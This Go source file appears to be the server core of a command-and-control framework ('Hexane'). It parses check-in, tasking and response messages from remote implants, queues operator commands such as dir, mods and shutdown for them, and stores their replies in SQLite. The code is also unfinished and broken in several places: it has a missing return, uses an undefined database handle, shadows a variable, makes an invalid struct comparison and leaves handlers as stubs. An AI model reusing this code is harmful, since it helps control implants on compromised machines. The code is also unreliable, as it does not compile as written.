package core

import (
	"encoding/json"
	"database/sql"
	"fmt"
	"math/bits"
	"os"
	"strings"
	"sync"
)

const HeaderLength = 12

var (
	Cmd      string
	CmdMu    sync.Mutex

	CommandMap = map[string]uint32{
		"dir":      CommandDir,
		"mods":     CommandMods,
		"shutdown": CommandShutdown,
	}
)

func (h *HexaneConfig) SaveConfig() error {
	file, err := os.Create(h.Database + ".json")
	if err != nil {
		return err
	}
	defer func() {
		if err = file.Close(); err != nil {
			WrapMessage("ERR", "error closing config database json")
		}
	}()

	encoder := json.NewEncoder(file)
	return encoder.Encode(h)
}

func (h *HexaneConfig) SqliteInit() (*sql.DB, error) {
	var (
		err error
		db *sql.DB
	)

	h.Database = h.UserConfig.Builder.OutputName + ".db"
	if db, err = sql.Open("sqlite3", h.Database); err != nil {
		return nil, err
	}

	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS parsers (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		data BLOB
	)`)

	if err != nil {
		return nil, err
	}

	return db, nil
}

func (h *HexaneConfig) ResponseWorker() error {
	var (
		err error
		data []byte
		db 		*sql.DB
	)

	if db, err = h.SqliteInit(); err != nil {
		return err
	}
	defer func() {
		if err = db.Close(); err != nil {
			WrapMessage("ERR", "error closing database: "+err.Error())
		}
	}()

	for parser := range h.ResponseChan {
		if data, err = json.Marshal(parser); err != nil {
			return fmt.Errorf("marshal response to JSON: "+err.Error())
		}

		if _, err = db.Exec(`INSERT INTO parsers (data) VALUES (?)`, string(data)); err != nil {
			return fmt.Errorf("write response to JSON: "+err.Error())
		}
	}
}

func (h *HexaneConfig) ProcessParsers(parser *Parser) error {
	var (
		err error
		rows *sql.Rows
	)

	if rows, err = db.Query(`SELECT data FROM parsers`); err != nil {
		return err
	}
	defer func() {
		if err = rows.Close(); err != nil {
			WrapMessage("ERR", "close row: "+err.Error())
		}
	}()

	for rows.Next() {

		var data []byte
		if err = rows.Scan(&data); err != nil {
			WrapMessage("ERR", "scan row: "+err.Error())
			continue
		}

		var parser Parser
		if err = json.Unmarshal(data, &parser); err != nil {
			WrapMessage("ERR", "unmarshal response to JSON: "+err.Error())
			continue
		}


	}
	return nil
}

func (m *Parser) DispatchCommand(s *Stream, UserInput string) error {
	var (
		Buffer      []string
		Arguments   []string
		Args        string
		Command     string
		CommandType uint32
	)

	if UserInput != "" {
		Buffer = strings.Split(UserInput, " ")
		Command = Buffer[0]

		Arguments = append(Arguments, Buffer[1:]...)
		Args = strings.Join(Arguments, " ")

		for k, v := range CommandMap {
			if strings.EqualFold(k, Command) {
				CommandType = v
				break
			}
		}
		if CommandType == 0 {
			return fmt.Errorf("unknown command: %s", UserInput)
		}
	} else {
		CommandType = CommandNoJob
	}

	s.PackDword(CommandType)
	s.PackString(Args)
	return nil
}

func (s *Stream) CreateHeader(peerId uint32, msgType uint32, taskId uint32) {

	s.PackDword(peerId)
	s.PackDword(taskId)
	s.PackDword(msgType)
}

func (h *HexaneConfig) HandleCheckin(parser *Parser, stream *Stream) {

	h.Mu.Lock()
	defer h.Mu.Unlock()

	h.CurrentTaskId++
	stream.CreateHeader(h.PeerId, TypeCheckin, uint32(h.CurrentTaskId))

	if h.CommandChan == nil {
		h.CommandChan = make(chan string)
	}
	if h.ResponseChan == nil {
		h.ResponseChan = make(chan *Parser)
	}

	h.Active = true
	h.ResponseChan <- parser
}

func (h *HexaneConfig) HandleResponse(Parser *Parser, Stream *Stream) {

	h.Mu.Lock()
	defer h.Mu.Unlock()

	h.CurrentTaskId++
	if h.ResponseChan != nil {
		if buffer := Parser.ParseTable(TypeTasking); buffer != TableMap{} {
			Stream.CreateHeader(h.PeerId, TypeCheckin, uint32(h.CurrentTaskId))
		}
	} else {
		WrapMessage("ERR", fmt.Sprintf("%s response channel is not open", h.PeerId))
	}
}

func (h *HexaneConfig) HandleCommand(Parser *Parser, Stream *Stream) {

	CmdMu.Lock()
	h.Mu.Lock()

	defer h.Mu.Unlock()
	defer CmdMu.Unlock()

	h.CurrentTaskId++
	Stream.CreateHeader(h.PeerId, TypeTasking, uint32(h.CurrentTaskId))

	if err := Parser.DispatchCommand(Stream, Cmd); err != nil {
		WrapMessage("ERR", err.Error())
	}

	Cmd = ""
}

func ParseMessage(body []byte) ([]byte, error) {
	var (
		err     error
		offset  uint32
		parser  *Parser
		implant *HexaneConfig
	)

	stream := new(Stream)

	for len(body) > 0 {
		if len(body) < HeaderLength {
			break
		}

		parser = CreateParser(body)

		parser.PeerId = bits.ReverseBytes32(parser.ParseDword())
		parser.TaskId = bits.ReverseBytes32(parser.ParseDword())
		parser.MsgType = bits.ReverseBytes32(parser.ParseDword())

		if len(body) >= HeaderLength+4 {
			offset = parser.ParseDword()
			offset += HeaderLength + 4

		} else {
			offset = HeaderLength
		}

		if offset > uint32(len(body)) {
			break
		}

		if implant = GetConfigByPeerId(parser.PeerId); implant != nil {

			switch parser.MsgType {
			case TypeCheckin:
				{
					WrapMessage("DBG", "incoming message is a checkin")
					implant.HandleCheckin(parser, stream)
					break
				}
			case TypeTasking:
				{
					WrapMessage("DBG", "incoming message is a task request")
					implant.HandleCommand(parser, stream)
					break
				}
			case TypeResponse:
				{
					WrapMessage("DBG", "incoming message is a response with data")
					implant.HandleResponse(parser, stream)
					break
					// print response
				}
			case TypeSegment:
				{
					WrapMessage("DBG", "incoming message is a segment with data")
					// this will loop and do nothing.
				}
			default:
				{
					WrapMessage("ERR", fmt.Sprintf("unknown message type: 0x%X", parser.MsgType))
					stream.Buffer = []byte("200 ok")
					break
				}
			}
		} else {
			WrapMessage("ERR", "could not find peer in the database")
			stream.Buffer = []byte("200 ok")
		}

		body = body[offset:]
	}

	return stream.Buffer, err
}
